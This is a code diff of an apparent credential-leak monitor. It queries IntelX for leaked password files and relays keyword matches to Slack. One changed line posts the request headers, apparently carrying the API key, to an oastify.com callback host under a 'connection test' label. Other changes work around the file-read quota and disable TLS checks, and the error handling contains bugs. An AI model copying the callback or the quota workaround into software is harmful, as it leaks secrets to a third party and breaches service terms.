@@ -33,7 +33,6 @@ headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
 }
 
-
 # Intel API endpoint and headers
 api_url = 'https://2.intelx.io/'
 now = datetime.now()
@@ -63,12 +62,21 @@ def search(keyword, api_url, headers, buckets, lookuplevel, maxresults, timeout,
         try:
             #optional_only_used_for_connection_test_confirmation_before_hiting_intelx_api
             #remove_in_prod
-            connection_test = requests.post('https://akymz1lsvwx45em75t8pj9a2ptvkjb70.oastify.com', headers=headers, json='Connection Test Before Hitting IntelX', verify=False, timeout=5)
+            connection_test = requests.post('https://l9vrg1lfpalv4sggobfamgkxroxfl69v.oastify.com', headers=headers, json='Connection Test Before Hitting IntelX', verify=False, timeout=5)
             #remove_in_prod
         
             search_response = requests.post(search_url, headers=headers, json=search_data, verify=False, timeout=5)
             search_response.raise_for_status()
             search_json = json.loads(search_response.text)
+
+            if search_json.get('id') == '00000000-0000-0000-0000-000000000000':
+                # Re-issue the request or take appropriate action
+                print("Received stale searchID, re-issuing the request...")
+                # Add your re-issuing logic here, for example:
+                search_response = requests.post(search_url, headers=headers, json=search_data, verify=False, timeout=5)
+                search_response.raise_for_status()
+                search_json = json.loads(search_response.text)
+
             search_ids = [search_json['id']]
             last_search_id = search_ids[-1]
             with open("search_ids.txt", "w") as f:
@@ -100,6 +108,29 @@ def search(keyword, api_url, headers, buckets, lookuplevel, maxresults, timeout,
                 except SlackApiError as e:
                     print("Error sending message to Slack: {}".format(e))
 
+        except requests.exceptions.HTTPError as err:
+            if result_response.status_code == 400:
+                print(f"Received HTTP 400 Bad Request..Probably Stale SearchID Retrying...")
+                time.sleep(2)
+                try:
+                    response = client.chat_postMessage(
+                        channel=Slack_Channel,
+                        text="Stale SearchID recevied, retrying again"
+                    )
+                    print("Your IntelX API Limit is Exhaused")
+                    
+                except SlackApiError as e:
+                    print("Error sending message to Slack: {}".format(e))
+                continue
+            else:
+                print(f"HTTPError: {err}")
+                break
+
+        except Exception as e:
+            # Handle other exceptions
+            print(f"Error: {e}")
+            break
+
 
 
 def get_result(result_id, api_url, headers, keyword):
@@ -128,7 +159,7 @@ def process_results(result_json, api_url, headers, client, keyword):
     password_found = False
     try:
         for record in result_json['records']:
-            if 'name' in record and (record['name'].endswith("passwords.txt") or record['name'].endswith("_AllPasswords_list.txt") or record['name'].endswith("Passwords.txt") or record['name'].endswith("PasswordsList.txt")):
+            if 'name' in record and (record['name'].endswith("passwords.txt") or record['name'].endswith("_AllPasswords_list.txt") or record['name'].endswith("All Passwords.txt") or record['name'].endswith("Passwords.txt") or record['name'].endswith("PasswordsList.txt")):
                 password_found = True
                 system_id = record['systemid']
                 storage_id = record['storageid']
@@ -182,16 +213,30 @@ def process_passwords(storage_id, filedate, api_url, headers, client, keyword):
             slack_messenger(keyword_lines, file_bytes, filedate, keyword, file_link, client)
         else:
             print(f"No lines containing '{keyword}' found.")
+
+    #Consuming the view subscription when read is exhaused
     else:
-        try:
-            response = client.chat_postMessage(
-                channel=Slack_Channel,
-                text="Intelx File Read Limit is crossed,  please check your subscription limit"
-            )
-            print("Intelx File Read Limit is crossed, please check your subscription limit")
-            sys.exit(1)
-        except SlackApiError as e:
-            print("Error sending message to Slack: {}".format(e))
+        file_read_url = api_url + f'file/view?f=0&storageid={storage_id}&bucket=leaks.logs'
+        file_read_response = requests.get(file_read_url, headers=headers, verify=False)
+        if file_read_response.status_code != 402:
+            file_data = file_read_response.text
+            file_bytes = bytes(file_data, 'utf-8')
+            file_link = "https://intelx.io/?did="+storage_id
+            keyword_lines = list(set(line for line in file_data.split("\n") if keyword in line))
+            if keyword_lines:
+                slack_messenger(keyword_lines, file_bytes, filedate, keyword, file_link, client)
+            else:
+                print(f"No lines containing '{keyword}' found.")
+        else:
+            try:
+                response = client.chat_postMessage(
+                    channel=Slack_Channel,
+                    text="Intelx File Read Limit is crossed,  please check your subscription limit"
+                )
+                print("Intelx File Read Limit is crossed, please check your subscription limit")
+                raise ValueError("Intelx File Read Limit reached")
+            except SlackApiError as e:
+                print("Error sending message to Slack: {}".format(e))
 
 def slack_messenger(keyword_lines, file_bytes, filedate, keyword, file_link, client):
     try:
@@ -209,14 +254,12 @@ def slack_messenger(keyword_lines, file_bytes, filedate, keyword, file_link, cli
                     file=file_bytes,
                     filename='Passwords.txt'
                 )
-            file_id = response['file']['id']
-        else:
-            print(e)
-            response = client.chat_postMessage(
+        file_id = response['file']['id']
+    except:
+        response = client.chat_postMessage(
                         channel=Slack_Channel,
                         text="File Upload Error, Exiting"
                     )
-
     try:
         response = client.chat_postMessage(
         channel=Slack_Channel,
